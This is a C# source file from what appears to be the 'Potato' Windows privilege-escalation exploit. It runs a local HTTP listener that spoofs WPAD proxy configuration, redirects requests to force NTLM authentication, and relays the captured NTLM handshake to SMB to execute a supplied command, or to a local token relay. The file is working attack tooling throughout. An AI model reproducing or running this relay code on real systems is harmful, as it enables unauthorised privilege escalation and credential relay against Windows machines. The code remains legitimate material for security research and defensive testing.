using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Threading;
using QHelper;
using SSPITest;
using NHttp;
using SharpCifs;


namespace Potato
{
    class HTTPNtlmHandler
    {
        public AutoResetEvent finished = new AutoResetEvent(false);
        private int state = 0;
        private String cmd;
        private int srvPort;
        private String[] wpad_exclude;
        private Queue<byte[]> ntlmQueue = new Queue<byte[]>();
        private BlockingCollection<byte[]> new_ntlmQueueIn = new BlockingCollection<byte[]>();
        private BlockingCollection<byte[]> new_ntlmQueueOut = new BlockingCollection<byte[]>();
        private String enable_token;
        SSPIHelper sspihelp = new SSPIHelper(); 
        Thread tokenRelayThread;
        Thread smbRelayThread;
        SMBRelay smbRelay = new SMBRelay();
        String workingUri = null;
        //
        private byte[] getNtlmBlock(String header)
        {
            byte[] data;
            if (header.StartsWith("NTLM "))
            {
                data = Convert.FromBase64String(header.Substring(5));
            }
            else
            {
                data = null;
            }
            return data;
        }
        //
        private String getHeaderString(System.Collections.Specialized.NameValueCollection headers)
        {
            String headerString = "";
            foreach (String key in headers){
                headerString = headerString + key + ":" + headers[key] + "\n";
            }
            return headerString;
        }
        //
        public void recvRequest(object sender, HttpRequestEventArgs e)
        {
            using (var writer = new StreamWriter(e.Response.OutputStream))
            {
                HttpRequest request = e.Request;
                HttpResponse response = e.Response;
                System.Collections.Specialized.NameValueCollection headers = request.Headers;
                Console.WriteLine("Got Request: "+request.HttpMethod+" "+request.Url.AbsoluteUri.ToString()+"!");

                if (request.HttpMethod.ToLower().Equals("head") || request.HttpMethod.ToLower().Equals("get") || request.HttpMethod.ToLower().Equals("post") || request.HttpMethod.ToLower().Equals("options") || request.HttpMethod.ToLower().Equals("put"))
                {
                    if (request.Url.AbsoluteUri.ToString().Contains("GETHASHES"))
                    {
                        Console.WriteLine("Sending 401...");
                        if (headers["Authorization"] == null && workingUri == null)
                        {
                            Console.WriteLine("Got request for hashes...");
                            response.Headers.Add("WWW-Authenticate","NTLM");
                            response.StatusCode = 401;
                            state = 0;                          
                        }
                       
                        else
                        {
                            String authHeader = headers["Authorization"];
                            byte[] ntlmBlock = getNtlmBlock(authHeader);
                            if (ntlmBlock != null && (workingUri == null || workingUri == request.Url.AbsoluteUri.ToString()))
                            {
                                workingUri = request.Url.AbsoluteUri.ToString();
                                if (state == 0)
                                {
                                    //
                                    if (this.enable_token != null)
                                    {
                                        byte[] out_buffer = null;
                                        tokenRelayThread = new Thread(() => sspihelp.TokenRelay(new_ntlmQueueIn, new_ntlmQueueOut));
                                        new_ntlmQueueIn.Add(ntlmBlock);
                                        tokenRelayThread.Start();
                                        out_buffer = new_ntlmQueueOut.Take();
                                        if (out_buffer != null)
                                        {
                                            response.Headers.Add("WWW-Authenticate", "NTLM " + Convert.ToBase64String(out_buffer));
                                            state = state + 1;
                                            response.StatusCode = 401;
                                        }
                                    }
                                    else
                                    {
                                        smbRelayThread = new Thread(() => smbRelay.startSMBRelay(ntlmQueue, this.cmd));
                                        ntlmQueue.Clear();
                                        smbRelayThread.Start();
                                        ntlmQueue.Enqueue(ntlmBlock);
                                        byte[] challenge = null;
                                        Config.signalHandlerClient.WaitOne();
                                        challenge = ntlmQueue.Dequeue();
                                        Console.WriteLine("Got SMB challenge " + Convert.ToBase64String(challenge));
                                        if (challenge != null)
                                        {
                                            response.Headers.Add("WWW-Authenticate", "NTLM " + Convert.ToBase64String(challenge));
                                            state = state + 1;
                                            response.StatusCode = 401;
                                        }
                                    }
                                }
                                else if (state == 1 && request.Url.AbsoluteUri.ToString().Equals(workingUri))
                                {
                                    if (ntlmBlock[8] == 3)
                                    {
                                        //Console.WriteLine(Convert.ToBase64String(ntlmBlock));
                                    }
                                    //
                                    if (this.enable_token != null)
                                    {
                                        new_ntlmQueueIn.Add(ntlmBlock);
                                        response.StatusCode = 200;
                                        state = state + 1;
                                        byte[] checkStatus = new_ntlmQueueOut.Take();
                                        if (checkStatus[0] == 99)
                                        {
                                            writer.Close();
                                            tokenRelayThread.Abort();
                                            finished.Set();
                                            return;
                                        }
                                        else
                                        {
                                            workingUri = null;
                                            tokenRelayThread.Abort();
                                            new_ntlmQueueIn = new BlockingCollection<byte[]>();
                                            new_ntlmQueueOut = new BlockingCollection<byte[]>();
                                            sspihelp = new SSPIHelper();
                                            writer.Close();
                                            state = 0;
                                        }
                                    }
                                    else
                                    {
                                        ntlmQueue.Enqueue(ntlmBlock);
                                        Config.signalHandler.Set();
                                        response.StatusCode = 200;
                                        state = state + 1;
                                        Config.signalHandlerClient.WaitOne();
                                        byte[] checkStatus = ntlmQueue.Dequeue();
                                        if (checkStatus[0] == 99)
                                        {
                                            writer.Close();
                                            smbRelayThread.Abort();
                                            finished.Set();
                                            return;
                                        }
                                        else
                                        {
                                            workingUri = null;
                                            smbRelayThread.Abort();
                                            ntlmQueue = new Queue<byte[]>();
                                            smbRelay = new SMBRelay();
                                            writer.Close();
                                            state = 0;
                                        }
                                    }
                                }
                            }
                        }
                        writer.Close();
                        return;
                    }
                    ///
                    else if (request.Url.AbsoluteUri.ToString().Equals("http://127.0.0.1/wpad.dat") || request.Url.AbsoluteUri.ToString().Equals("http://wpad/wpad.dat"))
                    {
                        Console.WriteLine("Spoofing wpad...");
                        response.StatusCode = 200;
                        String responseTxt = "function FindProxyForURL(url,host){if (dnsDomainIs(host, \"localhost\")) return \"DIRECT\";";
                        for (int i = 0; i < wpad_exclude.Length;i++ )
                        {
                            responseTxt = responseTxt + "if (dnsDomainIs(host, \"" + wpad_exclude[i] + "\")) return \"DIRECT\";";
                        }
                        responseTxt = responseTxt + "return \"PROXY 127.0.0.1:80\";}";
                        writer.Write(responseTxt);
                    }
                    else if (workingUri == null && !request.Url.AbsoluteUri.ToString().Contains("wpad") && !request.Url.AbsoluteUri.ToString().Contains("favicon"))
                    {
                        Random rnd = new Random();
                        int sess = rnd.Next(1, 1000000);
                        response.Headers.Add("Location", "http://localhost:"+srvPort+"/GETHASHES"+sess);

                        Console.WriteLine("Redirecting to target.."+response.Headers["Location"]);
                        response.StatusCode = 302;
                        writer.Close();
                    }
                   
                }
                //
                else if (request.HttpMethod.ToLower().Equals("propfind"))
                {
                    if (request.Url.AbsoluteUri.ToString().Contains("http://localhost/test"))
                    {
                        Console.WriteLine("Got PROPFIND for /test... Responding");
                        response.StatusCode = 207;
                        response.ContentType = "application/xml";
                        writer.Write("<?xml version='1.0' encoding='UTF-8'?><ns0:multistatus xmlns:ns0=\"DAV:\"><ns0:response><ns0:href>/test/</ns0:href><ns0:propstat><ns0:prop><ns0:resourcetype><ns0:collection /></ns0:resourcetype><ns0:creationdate>2015-08-03T14:53:38Z</ns0:creationdate><ns0:getlastmodified>Tue, 11 Aug 2015 15:48:25 GMT</ns0:getlastmodified><ns0:displayname>test</ns0:displayname><ns0:lockdiscovery /><ns0:supportedlock><ns0:lockentry><ns0:lockscope><ns0:exclusive /></ns0:lockscope><ns0:locktype><ns0:write /></ns0:locktype></ns0:lockentry><ns0:lockentry><ns0:lockscope><ns0:shared /></ns0:lockscope><ns0:locktype><ns0:write /></ns0:locktype></ns0:lockentry></ns0:supportedlock></ns0:prop><ns0:status>HTTP/1.1 200 OK</ns0:status></ns0:propstat></ns0:response></ns0:multistatus>");
                        writer.Close();
                    }
                    else
                    {
                        Console.WriteLine("Got PROPFIND for "+request.Url.AbsoluteUri.ToString()+" returning 404");
                        response.StatusCode = 404;
                        writer.Close();
                    }
                }
                else
                {
                    Console.WriteLine("Got " + request.HttpMethod + " for " + request.Url.AbsoluteUri.ToString()+" replying 404");
                    response.StatusCode = 404;
                    writer.Close();
                }

            }
        
        }
        //
        public void startListening(String cmd,String[] wpad_exclude,int port, String enable_token)
        {
            HttpServer server = new HttpServer();
            this.cmd = cmd;
            this.wpad_exclude = wpad_exclude;
            this.srvPort = port;
            this.enable_token = enable_token;
            server.EndPoint = new IPEndPoint(IPAddress.Loopback, port);
            server.RequestReceived += recvRequest;
            server.Start();
            Console.WriteLine("Listening...");
            while (true)
            {
                Thread.Sleep(5000);
            }
        }
    }
}